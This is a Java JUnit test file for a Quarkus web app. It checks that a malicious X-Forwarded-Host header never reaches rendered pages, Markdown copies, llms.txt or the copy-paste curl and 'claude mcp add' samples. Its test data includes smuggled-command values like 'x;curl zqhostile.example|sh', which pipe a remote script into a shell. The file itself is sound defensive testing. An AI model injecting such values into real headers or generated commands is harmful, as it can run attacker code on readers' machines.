package com.eldermoraes.seo;

import io.quarkus.test.junit.QuarkusTest;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.CsvSource;

import static io.restassured.RestAssured.given;
import static org.hamcrest.CoreMatchers.containsString;
import static org.hamcrest.CoreMatchers.not;

/**
 * Defence in depth (2.12.0): in production Caddy overwrites X-Forwarded-Host,
 * but the host also goes into samples a reader copies and runs (curl, fetch,
 * claude mcp add). A header that is not a host name or address, with an
 * optional port, never reaches the HTML, llms.txt or the samples.
 */
@QuarkusTest
class HostileForwardedHostTest {

    @ParameterizedTest(name = "{0} with X-Forwarded-Host [{1}]")
    @CsvSource(delimiter = '|', quoteCharacter = '`', value = {
            "/docs/mcp | `x;curl zqhostile.example|sh`",
            "/docs/mcp | `zqhostile example`",
            "/docs/mcp | `zqhostile\"example`",
            "/llms.txt | `x;curl zqhostile.example|sh`",
            "/llms.txt | `zqhostile'example`",
            "/resource/films/1 | `x;curl zqhostile.example|sh`",
            "/resource/films/1 | `zqhostile example`",
            "/resource/films/1 | `zqhostile'example`",
            "/resource/people/1 | `zqhostile\"example`",
            "/ | `x;curl zqhostile.example|sh`",
    })
    void neverReachesThePage(String path, String hostile) {
        given()
                .header("X-Forwarded-Host", hostile)
                .when().get(path)
                .then().statusCode(200)
                .body(not(containsString("zqhostile")));
    }

    // 2.14.0: the Markdown copies and /llms-full.txt carry the host in samples
    // too. Pairs in the same response: no hostile host, and the content is there.
    @ParameterizedTest(name = "{0} with X-Forwarded-Host [{1}]")
    @CsvSource(delimiter = '|', quoteCharacter = '`', value = {
            "/docs/mcp.md | `x;curl zqhostile.example|sh` | claude mcp add --transport http swapi-build http://localhost",
            "/docs/mcp.md | `zqhostile example` | claude mcp add --transport http swapi-build http://localhost",
            "/resource/films/1.md | `zqhostile'example` | curl http://localhost",
            "/index.html.md | `zqhostile\"example` | # The Star Wars API",
    })
    void markdownCopyIgnoresAHostileForwardedHost(String path, String hostile, String content) {
        given()
                .header("X-Forwarded-Host", hostile)
                .when().get(path)
                .then().statusCode(200)
                .body(containsString(content))
                .body(not(containsString("zqhostile")))
                .header("Link", not(containsString("zqhostile")));
    }

    @ParameterizedTest(name = "/llms-full.txt with X-Forwarded-Host [{0}]")
    @CsvSource(delimiter = '|', quoteCharacter = '`', value = {
            "`x;curl zqhostile.example|sh`",
            "`zqhostile'example`",
    })
    void llmsFullIgnoresAHostileForwardedHost(String hostile) {
        given()
                .header("X-Forwarded-Host", hostile)
                .when().get("/llms-full.txt")
                .then().statusCode(200)
                .body(containsString("claude mcp add --transport http swapi-build http://localhost"))
                .body(not(containsString("zqhostile")));
    }

    @ParameterizedTest(name = "{0}")
    @CsvSource({"/docs/mcp", "/resource/films/1", "/docs/mcp.md", "/resource/films/1.md", "/llms-full.txt"})
    void aPlainForwardedHostStillDecides(String path) {
        given()
                .header("X-Forwarded-Host", "preview.example")
                .when().get(path)
                .then().statusCode(200)
                .body(containsString("http://preview.example/"));
    }
}
